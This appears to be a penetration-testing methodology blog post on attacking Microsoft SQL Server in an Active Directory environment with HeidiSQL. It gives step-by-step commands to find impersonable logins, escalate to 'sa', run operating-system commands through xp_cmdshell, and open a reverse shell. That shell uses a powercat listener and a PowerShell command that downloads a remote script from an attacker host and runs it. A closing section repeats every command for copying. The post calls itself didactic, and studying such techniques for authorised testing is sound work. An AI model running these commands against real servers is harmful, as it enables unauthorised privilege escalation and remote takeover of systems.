---
title: "Active Directory - MSSQL HeidSQL"
tags: [Metodologies]
categories: ActiveDirectory
mermaid: true
image: https://www.safesystems.com/wp-content/uploads/2020/04/Microsofts-LDAP-Security-Update-and-the-Impact-on-Financial-Institutions-Today-Header-Blog-Image.png
---

# Active Directory - MSSQL HeidSQL

Here you will find some commands to explore Active Directory with MSSQL HeidSQL

Commands linked to msql instances in Windows AD.

Hope you enjoy.

# Summary

- [Active Directory - MSSQL HeidSQL](#active-directory---mssql-heidsql)
- [Summary](#summary)
- [Initial Consideration](#initial-consideration)
- [Connecting on the Database](#connecting-on-the-database)
- [Exploit the Server](#exploit-the-server)
  - [User Impersonation](#user-impersonation)
  - [RCE](#rce)
- [Conclusion](#conclusion)
  - [Commands Used](#commands-used)

![](https://0x4rt3mis.github.io/assets/img/active-enum/heidisql.png)

# Initial Consideration

Now, let's do SQL differently, through the access we have to it, using HeidiSQL

HeidiSQL download link

[HeidiSQL](https://www.heidisql.com/download.php)

And of course, of course, I'll hide all mentions for which environment I'm enumerating, here it's just for didactic purposes!

# Connecting on the Database

Once we've verified that we have an accessible database there in PowerUpSQL now it's time to check if we have access to it.

![](https://0x4rt3mis.github.io/assets/img/active-enum/heidi.png)

We got it

![](https://0x4rt3mis.github.io/assets/img/active-enum/heidi1.png)

# Exploit the Server

Once connected it is now time to start exploring that server

## User Impersonation

Once logged into HeidiSQL, we should look for users that we have the power to impersonate, in case it runs as if it were 'runes', the commands to check this are:

```
SELECT DISTINCT b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
```

![](https://0x4rt3mis.github.io/assets/img/active-enum/heidi2.png)

Credits

[Link 1](https://blog.netspi.com/hacking-sql-server-stored-procedures-part-2-user-impersonation/)

[Link 2](https://cheats.philkeeble.com/active-directory/mssql)

We found that we can impersonate two users, `sa` and `dbuser`

So let's go!

## RCE

```
EXECUTE AS LOGIN = 'dbuser'
EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'whoami'
```

![](https://0x4rt3mis.github.io/assets/img/active-enum/heidi3.png)

We have RCE!

Now just get a reverse shell there!

We will use Nishang's `Invoke-PowerShellTCP.ps1`

[PowerShellTCP](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

The `HFS` to host your web server where the remote server will make requests

[HFS](https://www.rejetto.com/hfs/)

And the `powercat` to receive the reverse connection

[PowerCat](https://github.com/besimorhino/powercat/blob/master/powercat.ps1)

We set powercat on port 443 to receive the reverse connection

```ps1
powercat -l -v -p 443 -t 1000
```

![](https://0x4rt3mis.github.io/assets/img/active-enum/rev.png)

We fix it (we put the function call at the end of it to automatically run the reverse shell) and upload the Invoke-PowerShellTCP.ps1 into the HFS

![](https://0x4rt3mis.github.io/assets/img/active-enum/rev1.png)

We executed the call in HeidiSQL and received the reverse shell!

```
EXECUTE AS LOGIN = 'dbuser'
EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'powershell.exe IEX((New-Object Net.WebClient).DownloadString(''http://x.x.x.x/Invoke-PowerShellTCP.ps1''))'
```

![](https://0x4rt3mis.github.io/assets/img/active-enum/heidi4.png)

Great!

# Conclusion

So now we're done exploring MS SQL Server in another way, through HEIDISql.

## Commands Used

```
SELECT DISTINCT b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
```

```
EXECUTE AS LOGIN = 'dbuser'
EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'whoami'
```

```
powercat -l -v -p 443 -t 1000
```

```
EXECUTE AS LOGIN = 'dbuser'
EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'powershell.exe IEX((New-Object Net.WebClient).DownloadString(''http://x.x.x.x/Invoke-PowerShellTCP.ps1''))'
```